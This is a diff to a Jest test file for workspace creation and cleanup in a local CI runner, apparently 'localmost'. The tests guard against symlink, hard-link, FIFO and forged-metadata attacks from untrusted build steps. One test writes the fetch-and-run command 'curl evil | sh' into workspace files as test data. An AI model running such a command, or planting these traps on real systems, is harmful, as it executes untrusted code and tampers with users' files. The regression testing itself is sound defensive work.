@@ -1,5 +1,5 @@
 /**
- * Cleaning up workspaces on a real filesystem.
+ * Creating and cleaning up workspaces on a real filesystem.
  *
  * A workspace's metadata file lives inside the workspace, which every step of
  * the run it holds can write. Cleanup used to take the directory to delete
@@ -10,7 +10,7 @@ import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
-import { execFileSync } from 'child_process';
+import { execFileSync, spawn } from 'child_process';
 import { cleanupWorkspaces, createWorkspace, getWorkspacesDir, listWorkspaces, removeWorkspace } from './workspace';
 
 let appData: string;
@@ -26,6 +26,9 @@ afterEach(() => {
   delete process.env.LOCALMOST_CONFIG_DIR;
   fs.rmSync(appData, { recursive: true, force: true });
 });
+
+/** A workspace id as createWorkspace names one made at the given time. */
+const idAt = (ms: number): string => `ws-${ms.toString(36)}-abc123`;
 
 const makeWorkspace = (name: string, metadata: Record<string, unknown>) => {
   const dir = path.join(getWorkspacesDir(), name);
@@ -48,6 +51,259 @@ describe('workspace creation', () => {
     expect(fs.statSync(getWorkspacesDir()).mode & 0o777).toBe(0o700);
     expect(fs.statSync(ws.path).mode & 0o777).toBe(0o700);
     expect(fs.readFileSync(path.join(ws.path, 'README'), 'utf-8')).toBe('hi\n');
+  });
+
+  /** A checkout that is a git repository, with the given files. */
+  const gitCheckout = (files: Record<string, string>): string => {
+    const source = path.join(appData, 'checkout');
+    fs.mkdirSync(source);
+    execFileSync('git', ['init', '-q'], { cwd: source });
+    for (const [name, content] of Object.entries(files)) {
+      fs.mkdirSync(path.dirname(path.join(source, name)), { recursive: true });
+      fs.writeFileSync(path.join(source, name), content);
+    }
+    return source;
+  };
+
+  /** Every path in a tree, relative to it, directories marked with a slash. */
+  const tree = (dir: string, rel = ''): string[] =>
+    fs.readdirSync(path.join(dir, rel), { withFileTypes: true }).flatMap((entry) => {
+      const name = rel ? `${rel}/${entry.name}` : entry.name;
+      return entry.isDirectory() ? [`${name}/`, ...tree(dir, name)] : [name];
+    });
+
+  it('is a private copy of the checkout: a step that writes a workspace file does not write the checkout', async () => {
+    // The step profile grants writes on the workspace. A hard-linked
+    // workspace shared every file's inode with the checkout, so a step - a
+    // third-party action among them - appended to the user's own build.sh.
+    const source = gitCheckout({ 'sub/build.sh': 'make\n', '.localmostrc': 'version: 1\n' });
+    fs.chmodSync(path.join(source, 'sub', 'build.sh'), 0o755);
+    fs.chmodSync(path.join(source, 'sub'), 0o750);
+    const outside = path.join(appData, 'outside');
+    fs.writeFileSync(outside, 'the user\'s\n');
+    fs.symlinkSync(outside, path.join(source, 'link'));
+    // A FIFO in the checkout is neither copied nor waited on.
+    execFileSync('mkfifo', [path.join(source, 'pipe')]);
+
+    for (const respectGitignore of [true, false]) {
+      const ws = await createWorkspace({ sourceDir: source, respectGitignore });
+
+      for (const name of ['sub/build.sh', '.localmostrc']) {
+        fs.appendFileSync(path.join(ws.path, name), 'curl evil | sh\n');
+        expect(fs.statSync(path.join(ws.path, name)).nlink).toBe(1);
+        expect(fs.statSync(path.join(source, name)).nlink).toBe(1);
+      }
+      expect(fs.readFileSync(path.join(source, 'sub', 'build.sh'), 'utf-8')).toBe('make\n');
+      expect(fs.readFileSync(path.join(source, '.localmostrc'), 'utf-8')).toBe('version: 1\n');
+      expect(fs.statSync(path.join(ws.path, 'sub', 'build.sh')).mode & 0o777).toBe(0o755);
+      expect(fs.statSync(path.join(ws.path, 'sub')).mode & 0o777).toBe(0o750);
+      // A link is copied as the link, never as what it points to.
+      expect(fs.readlinkSync(path.join(ws.path, 'link'))).toBe(outside);
+      expect(fs.existsSync(path.join(ws.path, 'pipe'))).toBe(false);
+    }
+  });
+
+  it('never reads the checkout\'s .gitignore as rsync filter rules', async () => {
+    // To git a line that is only "!" is nothing; to rsync's --exclude-from
+    // it cleared every rule before it, the default .git exclude among them.
+    const source = gitCheckout({
+      '.gitignore': 'node_modules\n!\nsecret.env\n',
+      'a.txt': 'a\n',
+      'secret.env': 'TOKEN=1\n',
+      'node_modules/m/index.js': 'x\n',
+      'sub/b.txt': 'b\n',
+      'sub/node_modules/n.js': 'x\n',
+      'build.log': 'x\n',
+    });
+    // A repository nested in the checkout is listed by its own rules, never
+    // its .git.
+    execFileSync('git', ['init', '-q', path.join(source, 'nested')]);
+    fs.writeFileSync(path.join(source, 'nested', 'n.txt'), 'n\n');
+
+    const ws = await createWorkspace({ sourceDir: source });
+
+    expect(tree(ws.path).sort()).toEqual(
+      ['.gitignore', '.localmost-workspace.json', 'a.txt', 'nested/', 'nested/n.txt', 'sub/', 'sub/b.txt'].sort()
+    );
+
+    // Without the ignore rules every file is copied, but never .git or
+    // node_modules.
+    const all = await createWorkspace({ sourceDir: source, respectGitignore: false });
+    expect(tree(all.path)).toEqual(expect.arrayContaining(['secret.env', 'a.txt', 'nested/n.txt']));
+    expect(tree(all.path).filter((p) => /(^|\/)(\.git|node_modules)(\/|$)/.test(p))).toEqual([]);
+  });
+
+  it('applies a checkout\'s .gitignore as git does when the checkout is not a repository', async () => {
+    const source = path.join(appData, 'plain');
+    fs.mkdirSync(path.join(source, '.git'), { recursive: true });
+    fs.writeFileSync(path.join(source, '.git', 'config'), '[core]\n\tbare = false\n');
+    fs.writeFileSync(path.join(source, '.gitignore'), 'ignored.txt\n!\n');
+    fs.writeFileSync(path.join(source, 'ignored.txt'), 'x\n');
+    fs.writeFileSync(path.join(source, 'kept.txt'), 'k\n');
+
+    const ws = await createWorkspace({ sourceDir: source });
+
+    expect(tree(ws.path).sort()).toEqual(['.gitignore', '.localmost-workspace.json', 'kept.txt']);
+  });
+
+  it('refuses to create a workspace whose ignore rules it cannot read, rather than copy what they exclude', async () => {
+    const source = path.join(appData, 'plain');
+    fs.mkdirSync(source);
+    fs.writeFileSync(path.join(source, '.gitignore'), '.env\n');
+    fs.writeFileSync(path.join(source, '.env'), 'TOKEN=1\n');
+    // No git on this Mac.
+    jest.spyOn(jest.requireActual<typeof import('child_process')>('child_process'), 'execFileSync').mockImplementation(() => {
+      throw Object.assign(new Error('spawnSync git ENOENT'), { code: 'ENOENT' });
+    });
+
+    await expect(createWorkspace({ sourceDir: source })).rejects.toThrow(/--no-ignore/);
+  });
+
+  it('writes its metadata into the workspace, never through a link the checkout put at its name', async () => {
+    // The checkout is copied first, its links as links; the metadata was
+    // then written through whatever was at its name, by this unsandboxed
+    // process.
+    const victim = path.join(appData, 'victim');
+    fs.writeFileSync(victim, 'the user\'s\n');
+    const source = gitCheckout({ 'a.txt': 'a\n' });
+    fs.symlinkSync(victim, path.join(source, '.localmost-workspace.json'));
+
+    for (const respectGitignore of [true, false]) {
+      const ws = await createWorkspace({ sourceDir: source, respectGitignore });
+
+      expect(fs.readFileSync(victim, 'utf-8')).toBe('the user\'s\n');
+      expect(fs.lstatSync(path.join(ws.path, '.localmost-workspace.json')).isFile()).toBe(true);
+      expect(JSON.parse(fs.readFileSync(path.join(ws.path, '.localmost-workspace.json'), 'utf-8')).id).toBe(ws.id);
+    }
+  });
+
+  it('copies a staged checkout\'s links as links, never what they point to', async () => {
+    // A tracked link to a file of the user's put that file's contents in
+    // the workspace, for every step to read.
+    const secret = path.join(appData, 'id_ed25519');
+    fs.writeFileSync(secret, 'PRIVATE KEY\n');
+    const source = gitCheckout({ 'a.txt': 'a\n' });
+    fs.symlinkSync(secret, path.join(source, 'key'));
+    execFileSync('git', ['add', 'a.txt', 'key'], { cwd: source });
+
+    const ws = await createWorkspace({ sourceDir: source, stagedOnly: true });
+
+    expect(fs.readlinkSync(path.join(ws.path, 'key'))).toBe(secret);
+    expect(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf-8')).toBe('a\n');
+    expect(fs.statSync(path.join(ws.path, 'a.txt')).nlink).toBe(1);
+  });
+
+  /** Git in a test repository, as a user with a name, its chatter kept out. */
+  const git = (cwd: string, ...args: string[]): void => {
+    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { cwd, stdio: 'ignore' });
+  };
+
+  /** A repository at dir, with its files committed. */
+  const committedRepo = (dir: string, files: Record<string, string>): void => {
+    fs.mkdirSync(dir, { recursive: true });
+    git(dir, 'init', '-q');
+    for (const [name, content] of Object.entries(files)) {
+      fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
+      fs.writeFileSync(path.join(dir, name), content);
+    }
+    git(dir, 'add', '.');
+    git(dir, 'commit', '-qm', 'files');
+  };
+
+  it('never copies a nested repository\'s .git into a staged workspace', async () => {
+    // A repository added in place, as a gitlink: git lists it as its
+    // directory, which was copied whole, its .git with the credential in its
+    // remote's URL among it, for every step to read and write.
+    const source = gitCheckout({ 'a.txt': 'a\n' });
+    const nested = path.join(source, 'nested');
+    committedRepo(nested, { 'n.txt': 'n\n' });
+    git(nested, 'config', 'remote.origin.url', 'https://user:ghp_SECRET@github.com/o/r.git');
+    git(source, 'add', 'a.txt', 'nested');
+
+    const ws = await createWorkspace({ sourceDir: source, stagedOnly: true });
+
+    // The submodule's directory is there, and empty, as a checkout without
+    // submodules leaves it.
+    expect(tree(ws.path).sort()).toEqual(['.localmost-workspace.json', 'a.txt', 'nested/']);
+  });
+
+  it('applies the checkout\'s ignore rules, and a nested repository\'s own, inside a nested repository or submodule', async () => {
+    // A directory git lists - a submodule, a repository nested untracked, a
+    // tracked file now a directory - was copied whole, and whatever either
+    // repository's rules ignore in it, a .env say, with it.
+    const source = path.join(appData, 'checkout');
+    committedRepo(path.join(source, 'sub'), { 's.txt': 's\n' });
+    committedRepo(source, { '.gitignore': '*.env\n', 'a.txt': 'a\n', config: 'c\n' });
+    fs.writeFileSync(path.join(source, 'sub', 'prod.env'), 'TOKEN=1\n');
+    const untracked = path.join(source, 'un');
+    committedRepo(untracked, { '.gitignore': 'creds.json\n', 'k.txt': 'k\n' });
+    fs.writeFileSync(path.join(untracked, 'x.env'), 'TOKEN=2\n');
+    fs.writeFileSync(path.join(untracked, 'creds.json'), '{}\n');
+    fs.writeFileSync(path.join(untracked, 'u.txt'), 'u\n');
+    fs.rmSync(path.join(source, 'config'));
+    fs.mkdirSync(path.join(source, 'config'));
+    fs.writeFileSync(path.join(source, 'config', 'prod.env'), 'TOKEN=3\n');
+    fs.writeFileSync(path.join(source, 'config', 'c.txt'), 'c\n');
+
+    const ws = await createWorkspace({ sourceDir: source });
+
+    expect(tree(ws.path).sort()).toEqual(
+      [
+        '.gitignore',
+        '.localmost-workspace.json',
+        'a.txt',
+        'config/',
+        'config/c.txt',
+        'sub/',
+        'sub/s.txt',
+        'un/',
+        'un/.gitignore',
+        'un/k.txt',
+        'un/u.txt',
+      ].sort()
+    );
+  });
+
+  it('copies the files git lists whatever Unicode form or case their names have on disk', async () => {
+    // Git on a Mac lists names precomposed, and in the case its index holds;
+    // a name written decomposed, or renamed only in case, was matched
+    // against neither and left out, with all that was in it.
+    const nfd = (name: string): string => name.normalize('NFD');
+    const source = path.join(appData, 'checkout');
+    committedRepo(source, {
+      [nfd('café.txt')]: 'c\n',
+      [`${nfd('résumé')}/f.txt`]: 'f\n',
+      'Src/a.ts': 'a\n',
+      'README.md': 'r\n',
+    });
+    fs.renameSync(path.join(source, 'Src'), path.join(source, 'src'));
+    fs.renameSync(path.join(source, 'README.md'), path.join(source, 'Readme.md'));
+
+    const ws = await createWorkspace({ sourceDir: source });
+
+    const fold = (name: string): string => name.normalize('NFC').toLowerCase();
+    expect(tree(ws.path).map(fold).sort()).toEqual(
+      ['.localmost-workspace.json', 'café.txt', 'readme.md', 'résumé/', 'résumé/f.txt', 'src/', 'src/a.ts'].map(fold).sort()
+    );
+    expect(fs.readFileSync(path.join(ws.path, 'src', 'a.ts'), 'utf-8')).toBe('a\n');
+  });
+
+  it('lists a checkout that a repository around it ignores by the checkout\'s own rules', async () => {
+    // A home directory kept as a dotfiles repository that ignores
+    // everything: git answered from that repository, with nothing.
+    const home = path.join(appData, 'home');
+    fs.mkdirSync(home);
+    git(home, 'init', '-q');
+    fs.writeFileSync(path.join(home, '.gitignore'), '*\n!.gitignore\n');
+    const source = path.join(home, 'proj');
+    fs.mkdirSync(source);
+    fs.writeFileSync(path.join(source, '.gitignore'), 'x.env\n');
+    fs.writeFileSync(path.join(source, 'a.txt'), 'a\n');
+    fs.writeFileSync(path.join(source, 'x.env'), 'TOKEN=1\n');
+
+    const ws = await createWorkspace({ sourceDir: source });
+
+    expect(tree(ws.path).sort()).toEqual(['.gitignore', '.localmost-workspace.json', 'a.txt']);
   });
 });
 
@@ -77,6 +333,85 @@ describe('workspace cleanup', () => {
     const [ws] = listWorkspaces();
     expect(ws.id).toBe('ws-bbbb-2222');
     expect(ws.path).toBe(path.join(getWorkspacesDir(), 'ws-bbbb-2222'));
+  });
+
+  it('does not wait on a FIFO a step planted at its workspace\'s metadata', async () => {
+    // A step replaces its metadata file with a FIFO, or with a link to one.
+    // Every later run's cleanup opened it and blocked for a writer that never
+    // came. Here one comes after a few seconds, so that a cleanup that waits
+    // shows as slow rather than hanging the suite.
+    const fifo = path.join(makeWorkspace('ws-aaaa-1111', {}), '.localmost-workspace.json');
+    fs.rmSync(fifo);
+    execFileSync('mkfifo', [fifo]);
+    const elsewhere = path.join(appData, 'fifo');
+    execFileSync('mkfifo', [elsewhere]);
+    const linked = path.join(makeWorkspace('ws-bbbb-2222', {}), '.localmost-workspace.json');
+    fs.rmSync(linked);
+    fs.symlinkSync(elsewhere, linked);
+    const writers = [fifo, elsewhere].map((p) =>
+      spawn('/bin/sh', ['-c', 'sleep 4; printf "{}" > "$1"', 'sh', p], { stdio: 'ignore' })
+    );
+
+    try {
+      const started = Date.now();
+      const { removed } = await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 0 });
+      expect(Date.now() - started).toBeLessThan(2000);
+      expect(removed).toBe(2);
+      expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
+    } finally {
+      for (const writer of writers) writer.kill('SIGKILL');
+    }
+  }, 15000);
+
+  it('dates a workspace by its name, never by metadata a step can write', async () => {
+    // A step can rewrite its workspace's metadata, remove it or put a link
+    // there. A date far ahead kept its workspace - a copy of the checkout
+    // and its expanded scripts - past every age limit, and sorted it first,
+    // so the count limit removed the others in its place.
+    const hour = 60 * 60 * 1000;
+    const now = Date.now();
+    const future = { sourceDir: '/x', createdAt: '2999-01-01T00:00:00Z' };
+    const forged = makeWorkspace(idAt(now - 3 * hour), future);
+    const missing = makeWorkspace(idAt(now - 2 * hour), future);
+    fs.rmSync(path.join(missing, '.localmost-workspace.json'));
+    const elsewhere = path.join(appData, 'elsewhere.json');
+    fs.writeFileSync(elsewhere, JSON.stringify(future));
+    const linked = makeWorkspace(idAt(now - hour), future);
+    fs.rmSync(path.join(linked, '.localmost-workspace.json'));
+    fs.symlinkSync(elsewhere, path.join(linked, '.localmost-workspace.json'));
+    const newest = makeWorkspace(idAt(now - 1000), future);
+
+    expect(listWorkspaces().map((ws) => [ws.id, ws.createdAt])).toEqual(
+      (
+        [
+          [newest, now - 1000],
+          [linked, now - hour],
+          [missing, now - 2 * hour],
+          [forged, now - 3 * hour],
+        ] as Array<[string, number]>
+      ).map(([dir, at]) => [path.basename(dir), new Date(at).toISOString()])
+    );
+
+    expect(await cleanupWorkspaces({ maxAgeHours: 24, maxCount: 1 })).toEqual({ removed: 3, kept: 1 });
+    expect(fs.readdirSync(getWorkspacesDir())).toEqual([path.basename(newest)]);
+    expect(await cleanupWorkspaces({ maxAgeHours: 0, maxCount: 10 })).toEqual({ removed: 1, kept: 0 });
+    expect(fs.readdirSync(getWorkspacesDir())).toEqual([]);
+  });
+
+  it('carries on when another run removes a workspace while this one lists them', async () => {
+    // Another run's cleanup moves a workspace aside between this one's
+    // listing of the directory and its look at the workspace; the error
+    // failed a run whose jobs had all passed.
+    const gone = makeWorkspace(idAt(Date.now()), {});
+    fs.rmSync(path.join(gone, '.localmost-workspace.json'));
+    const realReaddirSync = fs.readdirSync.bind(fs) as (...args: unknown[]) => unknown;
+    jest.spyOn(jest.requireActual<typeof import('fs')>('fs'), 'readdirSync').mockImplementation(((...args: unknown[]) => {
+      const listed = realReaddirSync(...args);
+      if (args[0] === getWorkspacesDir()) fs.rmSync(gone, { recursive: true, force: true });
+      return listed;
+    }) as never);
+
+    await expect(cleanupWorkspaces({ maxAgeHours: 24, maxCount: 0 })).resolves.toEqual({ removed: 0, kept: 0 });
   });
 
   it('refuses to remove anything that is not a workspace directory', async () => {
@@ -215,11 +550,12 @@ describe('removing a workspace something of its run still writes', () => {
     fs.mkdirSync(path.join(aside, 'd0'), { recursive: true });
     fs.writeFileSync(path.join(aside, 'd0', 'output'), 'step');
     fs.symlinkSync(victim, path.join(aside, 'link'));
-    makeWorkspace('ws-bbbb-2222', { sourceDir: '/x', createdAt: new Date().toISOString() });
+    const recent = idAt(Date.now());
+    makeWorkspace(recent, { sourceDir: '/x', createdAt: new Date().toISOString() });
 
     await cleanupWorkspaces();
 
-    expect(fs.readdirSync(getWorkspacesDir())).toEqual(['ws-bbbb-2222']);
+    expect(fs.readdirSync(getWorkspacesDir())).toEqual([recent]);
     expect(fs.readFileSync(path.join(victim, 'keep'), 'utf-8')).toBe('kept');
   });
 });
